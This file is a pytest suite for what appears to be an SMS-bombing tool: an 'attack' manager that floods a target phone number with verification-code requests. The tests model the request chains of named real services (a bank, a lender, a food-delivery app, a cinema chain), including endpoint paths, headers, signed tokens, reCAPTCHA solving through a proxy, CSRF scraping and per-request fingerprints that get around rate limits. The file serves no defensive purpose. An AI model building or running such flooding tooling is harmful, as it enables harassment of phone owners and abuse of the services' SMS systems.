from __future__ import annotations

import asyncio
import uuid
from dataclasses import replace

import aiohttp
import pytest
from aiohttp import web

import attack as attack_mod
from attack import AttackManager, BadRequest, Busy, NoServices, Template

@pytest.fixture
async def server():
    hits = {"ok": 0, "fail": 0, "reject": 0, "silent": 0, "sms": 0, "chain": []}

    async def ok(_request):
        hits["ok"] += 1
        return web.Response(text="ok")

    async def fail(_request):
        hits["fail"] += 1
        return web.Response(status=500, text="boom")

    async def reject(_request):
        hits["reject"] += 1
        return web.Response(text='{"status":400,"errors":[{"code":"MOBILE_ID_AUTH"}]}')

    async def silent(_request):
        hits["silent"] += 1
        return web.Response(text="not yet")

    async def slow(_request):
        await asyncio.sleep(2)
        return web.Response(text="ok")

    async def raif_chain(request):
        hits["chain"].append(await request.text())
        return web.Response(text='{"step":"ok"}', content_type="application/json")

    async def raif_sms(request):
        hits["sms"] += 1
        return web.Response(text='{"success":true}', content_type="application/json")

    app = web.Application()
    app.router.add_post("/ok", ok)
    app.router.add_post("/fail", fail)
    app.router.add_post("/reject", reject)
    app.router.add_post("/silent", silent)
    app.router.add_post("/slow", slow)
    app.router.add_post("/api/raif-id/id/chain", raif_chain)
    app.router.add_post("/api/raif-id/otp/sms/send", raif_sms)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "127.0.0.1", 0)
    await site.start()
    port = site._server.sockets[0].getsockname()[1]
    yield port, hits
    await runner.cleanup()

def _template(name: str, port: int, path: str) -> Template:
    return Template(
        name=name,
        country="RU",
        method="POST",
        url=f"http://127.0.0.1:{port}{path}",
        headers={"X-Test": "1"},
        body="phone={{RAW}}&form=1",
        content_type="application/x-www-form-urlencoded",
        has_phone=True,
    )

@pytest.fixture
async def manager():
    mgr = AttackManager([], proxy="", timeout=3, delay_ms=0, max_attacks=2, max_workers=2)
    yield mgr
    await mgr.shutdown()

async def test_attack_counts_and_stops(server, manager):
    port, hits = server
    manager.templates = [replace(_template("ok", port, "/ok"), api_ok="ok")]
    attack = await manager.start("79161234567", duration=2, workers=1)
    await asyncio.sleep(0.35)
    assert attack.sent > 0

    attack.stop()
    await asyncio.wait_for(attack.wait(), timeout=3)
    assert not attack.running
    snapshot = attack.snapshot()
    assert snapshot["running"] is False
    assert snapshot["sent"] == attack.sent
    assert attack.ok == attack.sent
    assert snapshot["unconfirmed"] == 0
    assert hits["ok"] >= attack.sent

async def test_2xx_without_positive_marker_is_unconfirmed(server, manager):
    port, hits = server
    manager.templates = [_template("silent", port, "/silent")]
    attack = await manager.start("79161234567", duration=1, workers=1)
    await asyncio.sleep(0.3)
    attack.stop()
    await asyncio.wait_for(attack.wait(), timeout=3)

    snapshot = attack.snapshot()
    assert snapshot["sent"] >= 1
    assert snapshot["ok"] == 0
    assert snapshot["unconfirmed"] == snapshot["sent"]
    assert hits["silent"] >= 1

async def test_stop_cancels_inflight_request(server, manager):
    port, _hits = server
    manager.templates = [replace(_template("slow", port, "/slow"), api_ok="ok")]
    attack = await manager.start("79161234567", duration=10, workers=1)
    await asyncio.sleep(0.2)
    loop = asyncio.get_running_loop()
    started = loop.time()

    attack.stop()
    await asyncio.wait_for(attack.wait(), timeout=1)

    assert loop.time() - started < 1
    assert not attack.running

async def test_errors_are_counted(server, manager):
    port, hits = server
    manager.templates = [_template("fail", port, "/fail")]
    attack = await manager.start("79161234567", duration=1, workers=1)
    await asyncio.sleep(0.3)
    attack.stop()
    await asyncio.wait_for(attack.wait(), timeout=3)
    assert attack.sent >= 1
    assert attack.ok == 0
    assert hits["fail"] >= 1

async def test_api_error_is_not_ok(server, manager):
    port, hits = server
    template = replace(
        _template("reject", port, "/reject"),
        api_error='"code":"MOBILE_ID_AUTH"',
    )
    manager.templates = [template]
    attack = await manager.start("79161234567", duration=2, workers=1)
    await asyncio.sleep(0.35)

    attack.stop()
    await asyncio.wait_for(attack.wait(), timeout=3)
    assert attack.sent >= 1
    assert attack.ok == 0
    assert hits["reject"] >= 1

async def test_api_ok_requires_marker(server, manager):
    port, hits = server
    template = replace(
        _template("silent", port, "/silent"),
        api_ok='"success":"send_code"',
    )
    manager.templates = [template]
    attack = await manager.start("79161234567", duration=2, workers=1)
    await asyncio.sleep(0.35)

    attack.stop()
    await asyncio.wait_for(attack.wait(), timeout=3)
    assert attack.sent >= 1
    assert attack.ok == 0
    assert hits["silent"] >= 1

async def test_chain_job_counts_ok(manager, monkeypatch):
    async def fake(session, digits, headers, proxy):
        fake.calls += 1
        assert digits == "79161234567"
        return 200, b'{"status":"ok"}'

    fake.calls = 0
    monkeypatch.setitem(attack_mod.CHAINS, "fake", fake)

    manager.templates = [
        Template.from_raw(
            {
                "name": "chain",
                "country": "RU",
                "method": "POST",
                "url": "http://127.0.0.1/chain",
                "chain": "fake",
                "api_ok": '"status":"ok"',
            }
        )
    ]
    attack = await manager.start("79161234567", duration=1, workers=1)
    await asyncio.sleep(0.3)
    attack.stop()
    await asyncio.wait_for(attack.wait(), timeout=3)

    assert fake.calls >= 1
    assert attack.sent >= 1
    assert attack.ok == attack.sent
    assert attack.err == 0

async def test_chain_error_marker_is_not_ok(manager, monkeypatch):
    async def fake(session, digits, headers, proxy):
        return 200, b'{"error":"too_many"}'

    monkeypatch.setitem(attack_mod.CHAINS, "fake", fake)
    manager.templates = [
        Template.from_raw(
            {
                "name": "chain",
                "country": "RU",
                "method": "POST",
                "url": "http://127.0.0.1/chain",
                "chain": "fake",
                "api_error": '"error"',
            }
        )
    ]
    attack = await manager.start("79161234567", duration=1, workers=1)
    await asyncio.sleep(0.3)
    attack.stop()
    await asyncio.wait_for(attack.wait(), timeout=3)

    assert attack.sent >= 1
    assert attack.ok == 0

async def test_raiffeisen_chain_sends_three_requests(server, monkeypatch):
    port, hits = server
    base = f"http://127.0.0.1:{port}"
    monkeypatch.setattr(attack_mod, "_RAIF_BASE", base)
    monkeypatch.setattr(attack_mod, "_RAIF_CHAIN", f"{base}/api/raif-id/id/chain")
    monkeypatch.setattr(attack_mod, "_RAIF_SMS", f"{base}/api/raif-id/otp/sms/send")

    async with aiohttp.ClientSession() as session:
        status, chunk = await attack_mod._raiffeisen(
            session, "79161234567", {"X-Application": "RONLINE"}, None
        )

    assert status == 200
    assert chunk == b'{"success":true}'
    assert hits["chain"] == ["flow_version=1", "step_name=phone&phone=79161234567"]
    assert hits["sms"] == 1

async def test_greenmoney_chain_registers_and_confirms(monkeypatch):
    seen: dict[str, object] = {}

    async def start(request):
        seen["fingerprint"] = request.query.get("fingerPrint")
        seen["feature"] = request.headers.get("X-ClientRegistrationFeature")
        return web.json_response({"SessionId": "sid-1"})

    async def confirm(request):
        seen["body"] = await request.json()
        seen["app"] = request.headers.get("X-AppId")
        return web.json_response(
            {"RepeatSend": 60, "LengthCode": 6, "CodeNotExpected": False}
        )

    app = web.Application()
    app.router.add_get("/api/Account/StartRegistration", start)
    app.router.add_post("/api/Account/RegistrationByPhone/Confirm", confirm)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "127.0.0.1", 0)
    await site.start()
    port = site._server.sockets[0].getsockname()[1]
    base = f"http://127.0.0.1:{port}"
    monkeypatch.setattr(attack_mod, "_GM_START", f"{base}/api/Account/StartRegistration")
    monkeypatch.setattr(attack_mod, "_GM_CONFIRM", f"{base}/api/Account/RegistrationByPhone/Confirm")

    try:
        async with aiohttp.ClientSession() as session:
            status, chunk = await attack_mod._greenmoney(
                session, "79161234567", {"X-AppId": "app-1"}, None
            )
    finally:
        await runner.cleanup()

    assert status == 200
    assert b"RepeatSend" in chunk
    assert seen["feature"] == "8"
    assert isinstance(seen["fingerprint"], str) and len(seen["fingerprint"]) == 32
    body = seen["body"]
    assert body["SessionId"] == "sid-1"
    assert body["Phone"] == "+79161234567"
    assert [a["AgreementType"] for a in body["Agreements"]] == [16, 17, 49, 50, 51, 60]
    assert seen["app"] == "app-1"

async def test_pizza_sushi_wok_gets_signed_token_and_sends_phone(monkeypatch):
    seen = {}

    async def token(request):
        seen["signature"] = request.headers.get("X-Signature", "")
        seen["nonce"] = request.headers.get("X-Nonce", "")
        return web.json_response({"ok": True, "access_token": "test-token"})

    async def send(request):
        seen["phone"] = request.query["phone"]
        seen["authorization"] = request.headers["Authorization"]
        return web.json_response({"ok": True, "message": "Код отправлен"})

    app = web.Application()
    app.router.add_post("/auth/token", token)
    app.router.add_post("/user/request", send)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "127.0.0.1", 0)
    await site.start()
    port = site._server.sockets[0].getsockname()[1]
    monkeypatch.setattr(attack_mod, "_PIZZA_SUSHI_WOK_API", f"http://127.0.0.1:{port}")

    try:
        async with aiohttp.ClientSession() as session:
            status, chunk = await attack_mod._pizza_sushi_wok(
                session, "79161234567", {}, None
            )
    finally:
        await runner.cleanup()

    assert status == 200 and b'"ok": true' in chunk
    assert len(seen["signature"]) == 64
    assert len(seen["nonce"]) == 64
    assert seen["phone"] == "79161234567"
    assert seen["authorization"] == "Bearer test-token"

async def test_multiplex_login_then_recaptcha_then_sms(monkeypatch):
    calls = []

    async def login(request):
        assert await request.json() == {"login": "380671234567"}
        calls.append("login")
        return web.json_response({"Recaptcha": True, "SmsStatus": False})

    async def captcha(request):
        assert await request.json() == {"token": "fresh-token"}
        calls.append("captcha")
        return web.json_response({"Recaptcha": True, "SmsStatus": True})

    app = web.Application()
    app.router.add_post("/login", login)
    app.router.add_post("/captcha", captcha)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "127.0.0.1", 0)
    await site.start()
    port = site._server.sockets[0].getsockname()[1]
    base = f"http://127.0.0.1:{port}"
    monkeypatch.setattr(attack_mod, "_MULTIPLEX_LOGIN", f"{base}/login")
    monkeypatch.setattr(attack_mod, "_MULTIPLEX_CAPTCHA", f"{base}/captcha")
    solved = []

    class Cache:
        async def token(self, name, settings, proxy):
            solved.append((name, settings, proxy))
            return "fresh-token"

    settings = attack_mod.RecaptchaV3(
        "https://www.google.com/recaptcha/api2/anchor?ar=1&k=test&co=test"
    )

    try:
        async with aiohttp.ClientSession() as session:
            status, chunk = await attack_mod._multiplex(
                session, "380671234567", {}, None,
                Cache(), settings, "http://solver-proxy:8080",
            )
    finally:
        await runner.cleanup()

    assert status == 200 and b'"SmsStatus": true' in chunk
    assert calls == ["login", "captcha"]
    assert solved == [("Multiplex_UA_SMS", settings, "http://solver-proxy:8080")]

async def test_dead_target_backs_off(server, manager):
    manager.templates = [
        Template(name="dead", country="RU", method="POST", url="http://127.0.0.1:1/x", body="p={{RAW}}")
    ]
    attack = await manager.start("79161234567", duration=2, workers=1)
    await asyncio.sleep(1.2)
    attack.stop()
    await asyncio.wait_for(attack.wait(), timeout=3)

    assert attack.err < 40

async def test_manager_limits(server, manager):
    port, _ = server
    manager.templates = [_template("ok", port, "/ok")]
    first = await manager.start("79161234567", duration=2, workers=1)
    second = await manager.start("79161234567", duration=2, workers=1)

    with pytest.raises(Busy):
        await manager.start("79161234567", duration=2, workers=1)
    first.stop()
    second.stop()
    await asyncio.wait_for(asyncio.gather(first.wait(), second.wait()), timeout=3)

async def test_no_services_for_unknown_country(manager):
    manager.templates = []
    with pytest.raises(NoServices):
        await manager.start("79161234567", duration=5)

async def test_bad_request(manager):
    with pytest.raises(BadRequest):
        await manager.start("", duration=5)
    with pytest.raises(BadRequest):
        await manager.start("79161234567", duration=0)

async def test_workers_cap(manager, server):
    port, _ = server
    manager.templates = [_template("ok", port, "/ok")]
    attack = await manager.start("79161234567", duration=1, workers=99)
    assert attack.workers == manager.max_workers
    attack.stop()
    await asyncio.wait_for(attack.wait(), timeout=3)

async def test_snapshot_breaks_statuses_down_per_service(server, manager):
    port, hits = server
    manager.templates = [
        _template("Ok_RU_SMS", port, "/ok"),
        _template("Reject_RU_SMS", port, "/reject"),
    ]
    attack = await manager.start("79161234567", duration=2, workers=2)
    await asyncio.sleep(0.6)
    attack.stop()
    await asyncio.sleep(0.2)

    by_service = attack.snapshot()["by_service"]
    assert set(by_service) == {"Ok_RU_SMS", "Reject_RU_SMS"}
    assert by_service["Ok_RU_SMS"].get(200)
    assert by_service["Reject_RU_SMS"].get(200)
    assert sum(by_service["Ok_RU_SMS"].values()) <= attack.sent

@pytest.fixture
async def csrf_server():
    hits = {"form": 0, "send": 0, "bad": 0}
    uuids: set[str] = set()

    async def form(_request):
        hits["form"] += 1
        return web.Response(
            text='<form><input type="hidden" name="_token" value="tok123"></form>',
            content_type="text/html",
        )

    async def send(request):
        hits["send"] += 1
        data = await request.post()
        raw_uuid = str(data.get("uuid", ""))
        try:
            parsed = uuid.UUID(raw_uuid)
            valid_uuid = parsed.version == 4 and str(parsed) == raw_uuid
        except ValueError:
            valid_uuid = False
        if data.get("_token") != "tok123" or not valid_uuid or data.get("phone") != "79161234567":
            hits["bad"] += 1
            return web.Response(text='{"success":false}')
        uuids.add(raw_uuid)
        return web.Response(text='{"success":true}')

    app = web.Application()
    app.router.add_get("/form", form)
    app.router.add_post("/send", send)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "127.0.0.1", 0)
    await site.start()
    port = site._server.sockets[0].getsockname()[1]
    yield port, hits, uuids
    await runner.cleanup()

async def test_worker_fills_csrf_and_fresh_uuid(csrf_server, manager):
    port, hits, uuids = csrf_server
    template = Template(
        name="Csrf_UUID_RU_SMS",
        country="RU",
        method="POST",
        url=f"http://127.0.0.1:{port}/send",
        body="_token={{CSRF}}&uuid={{UUID}}&phone={{RAW}}",
        content_type="application/x-www-form-urlencoded",
        has_phone=True,
        api_ok='"success":true',
        csrf=attack_mod.CsrfSource(
            url=f"http://127.0.0.1:{port}/form",
            regex=r'name="_token"\s+value="([^"]+)"',
            ttl=60,
        ),
    )
    manager.templates = [template]
    attack = await manager.start("79161234567", duration=2, workers=1)
    await asyncio.sleep(0.6)
    attack.stop()
    await asyncio.wait_for(attack.wait(), timeout=3)

    assert hits["send"] >= 1
    assert hits["bad"] == 0, "CSRF/UUID подставлены неверно"
    assert attack.ok == attack.sent
    assert hits["form"] <= 2
    assert len(uuids) == hits["send"]

def test_is_proxy_error_discrimination():
    assert not attack_mod._is_proxy_error(aiohttp.ServerDisconnectedError())
    assert not attack_mod._is_proxy_error(asyncio.TimeoutError())
    assert not attack_mod._is_proxy_error(RuntimeError("remote server returned 502"))

    p_err = aiohttp.ClientHttpProxyError(
        request_info=None,
        history=(),
        status=407,
        message="Proxy Authentication Required",
        headers={},
    )
    assert attack_mod._is_proxy_error(p_err)
